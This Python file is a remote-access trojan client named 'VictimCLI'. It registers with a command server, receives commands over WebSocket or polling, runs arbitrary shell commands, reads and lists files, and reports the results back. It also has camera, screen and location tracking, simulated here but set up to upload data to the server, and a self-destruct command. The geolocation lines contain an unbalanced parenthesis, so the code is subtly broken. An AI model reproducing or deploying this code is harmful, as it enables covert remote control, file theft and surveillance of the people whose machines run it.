import requests
import websocket
import json
import uuid
import time
import os
import platform
import subprocess
from datetime import datetime
import threading

class VictimCLI:
    def __init__(self, server_url, victim_id=None):
        self.server_url = server_url
        self.victim_id = victim_id or str(uuid.uuid4())
        self.ws = None
        self.use_websocket = False
        self.command_queue = []
        self.response_queue = {}
        self.active = True
        self.camera_enabled = False
        self.screenshare_enabled = False
        self.geo_tracking_enabled = False
        
        # Register victim if not already registered
        if not self._check_registered():
            self._register_victim()
    
    def _check_registered(self):
        """Check if victim is already registered with the server"""
        try:
            response = requests.get(f"{self.server_url}/api/victims")
            victims = response.json()
            return any(v['id'] == self.victim_id for v in victims)
        except requests.RequestException:
            return False
    
    def _register_victim(self):
        """Register this victim with the server"""
        try:
            requests.get(f"{self.server_url}/?victim={self.victim_id}")
            print(f"Registered as victim with ID: {self.victim_id}")
            return True
        except requests.RequestException as e:
            print(f"Failed to register victim: {e}")
            return False
    
    def connect_websocket(self):
        """Connect to the server via WebSocket"""
        try:
            self.ws = websocket.WebSocketApp(
                f"ws://{self.server_url.split('://')[-1]}/victim?victim_id={self.victim_id}",
                on_message=self._on_ws_message,
                on_error=self._on_ws_error,
                on_close=self._on_ws_close,
                on_open=self._on_ws_open
            )
            
            # Start WebSocket in a background thread
            ws_thread = threading.Thread(target=self.ws.run_forever)
            ws_thread.daemon = True
            ws_thread.start()
            
            return True
        except Exception as e:
            print(f"WebSocket connection failed: {e}")
            self.use_websocket = False
            return False
    
    def _on_ws_open(self, ws):
        """Handle WebSocket connection opening"""
        self.use_websocket = True
        print("WebSocket connected successfully")
    
    def _on_ws_message(self, ws, message):
        """Handle incoming WebSocket messages"""
        try:
            data = json.loads(message)
            if 'command' in data:
                print(f"\nReceived command: {data['command']}")
                self.command_queue.append(data)
        except json.JSONDecodeError:
            print(f"\nReceived non-JSON message: {message}")
    
    def _on_ws_error(self, ws, error):
        """Handle WebSocket errors"""
        print(f"\nWebSocket error: {error}")
        self.use_websocket = False
    
    def _on_ws_close(self, ws, close_status_code, close_msg):
        """Handle WebSocket closure"""
        print("\nWebSocket connection closed")
        self.use_websocket = False
    
    def send_geo_data(self, lat, lon):
        """Send geolocation data to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/geo?victim={self.victim_id}",
                json={"lat": lat, "lon": lon}
            )
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send geo data: {e}")
            return None
    
    def send_camera_frame(self, frame_data):
        """Send camera frame to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/camera_frame?victim={self.victim_id}",
                data=frame_data,
                headers={'Content-Type': 'application/octet-stream'}
            )
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send camera frame: {e}")
            return None
    
    def send_screen_frame(self, frame_data):
        """Send screen frame to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/screen_frame?victim={self.victim_id}",
                data=frame_data,
                headers={'Content-Type': 'application/octet-stream'}
            )
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send screen frame: {e}")
            return None
    
    def check_commands(self):
        """Check for pending commands (polling method)"""
        if self.use_websocket and self.command_queue:
            return self.command_queue.pop(0)
        
        try:
            response = requests.get(
                f"{self.server_url}/api/poll_commands?victim_id={self.victim_id}"
            )
            command = response.json().get('command')
            if command:
                return command
            return None
        except requests.RequestException as e:
            print(f"Failed to check commands: {e}")
            return None
    
    def send_command_response(self, command_id, response):
        """Send response to a command"""
        try:
            if self.use_websocket and self.ws and self.ws.sock and self.ws.sock.connected:
                self.ws.send(json.dumps({
                    'victim_id': self.victim_id,
                    'command_id': command_id,
                    'response': response
                }))
            else:
                requests.post(
                    f"{self.server_url}/api/command_response",
                    params={
                        'victim_id': self.victim_id,
                        'command_id': command_id
                    },
                    json={'response': response}
                )
            return True
        except Exception as e:
            print(f"Failed to send command response: {e}")
            return False
    
    def execute_command(self, command_data):
        """Execute a command and return the response"""
        command = command_data['command']
        command_id = command_data['command_id']
        
        print(f"\n[!] Executing command: {command}")
        
        try:
            # System commands
            if command == 'get_system_info':
                result = {
                    'os': platform.system(),
                    'os_version': platform.version(),
                    'hostname': platform.node(),
                    'cpu': platform.processor(),
                    'architecture': platform.architecture()[0],
                    'python_version': platform.python_version()
                }
            
            elif command == 'execute_shell':
                cmd = command_data.get('args', '')
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    result = {'output': output.decode('utf-8', errors='replace')}
                except subprocess.CalledProcessError as e:
                    result = {'error': str(e), 'output': e.output.decode('utf-8', errors='replace')}
            
            # File system commands
            elif command == 'list_files':
                path = command_data.get('args', '.')
                try:
                    files = os.listdir(path)
                    result = {'path': path, 'files': files}
                except Exception as e:
                    result = {'error': str(e)}
            
            elif command == 'read_file':
                filename = command_data.get('args')
                try:
                    with open(filename, 'r') as f:
                        content = f.read()
                    result = {'filename': filename, 'content': content}
                except Exception as e:
                    result = {'error': str(e)}
            
            # Monitoring commands
            elif command == 'start_camera':
                self.camera_enabled = True
                result = {'status': 'Camera monitoring started'}
            
            elif command == 'stop_camera':
                self.camera_enabled = False
                result = {'status': 'Camera monitoring stopped'}
            
            elif command == 'start_screenshare':
                self.screenshare_enabled = True
                result = {'status': 'Screenshare started'}
            
            elif command == 'stop_screenshare':
                self.screenshare_enabled = False
                result = {'status': 'Screenshare stopped'}
            
            elif command == 'start_geo_tracking':
                self.geo_tracking_enabled = True
                result = {'status': 'Geolocation tracking started'}
            
            elif command == 'stop_geo_tracking':
                self.geo_tracking_enabled = False
                result = {'status': 'Geolocation tracking stopped'}
            
            # Special commands
            elif command == 'self_destruct':
                result = {'status': 'Self-destruct sequence initiated'}
                self.active = False
                print("\n[!] Self-destruct command received. Shutting down...")
                os._exit(0)
            
            else:
                result = {'error': f'Unknown command: {command}'}
            
            return result
        
        except Exception as e:
            return {'error': f'Command execution failed: {str(e)}'}
    
    def simulate_camera_capture(self):
        """Simulate camera capture (for demo purposes)"""
        if self.camera_enabled:
            # In a real implementation, this would capture from actual camera
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            frame_data = f"Simulated camera frame {timestamp}".encode()
            self.send_camera_frame(frame_data)
    
    def simulate_screenshare(self):
        """Simulate screen sharing (for demo purposes)"""
        if self.screenshare_enabled:
            # In a real implementation, this would capture actual screen
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            frame_data = f"Simulated screen frame {timestamp}".encode()
            self.send_screen_frame(frame_data)
    
    def simulate_geo_tracking(self):
        """Simulate geolocation tracking (for demo purposes)"""
        if self.geo_tracking_enabled:
            # In a real implementation, this would get actual location
            lat = 37.7749 + (0.1 * (hash(self.victim_id) % 10) / 100
            lon = -122.4194 + (0.1 * (hash(self.victim_id) % 10) / 100
            self.send_geo_data(lat, lon)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Victim CLI Client")
    parser.add_argument('--server', required=True, help="Server URL (e.g., http://localhost:5000)")
    parser.add_argument('--id', help="Existing victim ID (optional)")
    args = parser.parse_args()
    
    # Initialize client
    client = VictimCLI(args.server, args.id)
    
    # Try to connect via WebSocket
    client.connect_websocket()
    
    print(f"Victim CLI running with ID: {client.victim_id}")
    print("Type 'help' for available commands, 'exit' to quit")
    
    # Start monitoring threads
    def monitoring_loop():
        while client.active:
            client.simulate_camera_capture()
            client.simulate_screenshare()
            client.simulate_geo_tracking()
            time.sleep(5)  # Update every 5 seconds
    
    monitor_thread = threading.Thread(target=monitoring_loop)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Main loop
    while client.active:
        # Check for commands from server
        command_data = client.check_commands()
        if command_data:
            # Execute the command
            result = client.execute_command(command_data)
            
            # Send response back to server
            if client.send_command_response(command_data['command_id'], result):
                print("[+] Command response sent to server")
            else:
                print("[-] Failed to send command response")
        
        # Get user input for manual operations
        try:
            user_input = input("\nCLI> ").strip()
            if not user_input:
                continue
                
            if user_input.lower() == 'exit':
                break
                
            elif user_input.lower() == 'help':
                print("\nAvailable Commands:")
                print("  status - Show current status")
                print("  geo <lat> <lon> - Send geolocation data")
                print("  start_camera - Enable camera monitoring")
                print("  stop_camera - Disable camera monitoring")
                print("  start_screenshare - Enable screen sharing")
                print("  stop_screenshare - Disable screen sharing")
                print("  start_geo - Enable geolocation tracking")
                print("  stop_geo - Disable geolocation tracking")
                print("  exit - Quit the CLI")
            
            elif user_input == 'status':
                print(f"\nVictim ID: {client.victim_id}")
                print(f"Connection: {'WebSocket' if client.use_websocket else 'Polling'}")
                print(f"Camera: {'ON' if client.camera_enabled else 'OFF'}")
                print(f"Screenshare: {'ON' if client.screenshare_enabled else 'OFF'}")
                print(f"Geolocation: {'ON' if client.geo_tracking_enabled else 'OFF'}")
            
            elif user_input.startswith('geo '):
                try:
                    lat, lon = map(float, user_input[4:].split())
                    client.send_geo_data(lat, lon)
                    print("[+] Geolocation data sent")
                except:
                    print("Usage: geo <latitude> <longitude>")
            
            elif user_input == 'start_camera':
                client.camera_enabled = True
                print("[+] Camera monitoring enabled")
            
            elif user_input == 'stop_camera':
                client.camera_enabled = False
                print("[+] Camera monitoring disabled")
            
            elif user_input == 'start_screenshare':
                client.screenshare_enabled = True
                print("[+] Screenshare enabled")
            
            elif user_input == 'stop_screenshare':
                client.screenshare_enabled = False
                print("[+] Screenshare disabled")
            
            elif user_input == 'start_geo':
                client.geo_tracking_enabled = True
                print("[+] Geolocation tracking enabled")
            
            elif user_input == 'stop_geo':
                client.geo_tracking_enabled = False
                print("[+] Geolocation tracking disabled")
            
            else:
                print("Unknown command. Type 'help' for available commands")
        
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit properly")
            continue
    
    print("\nShutting down client...")

if __name__ == "__main__":
    main()
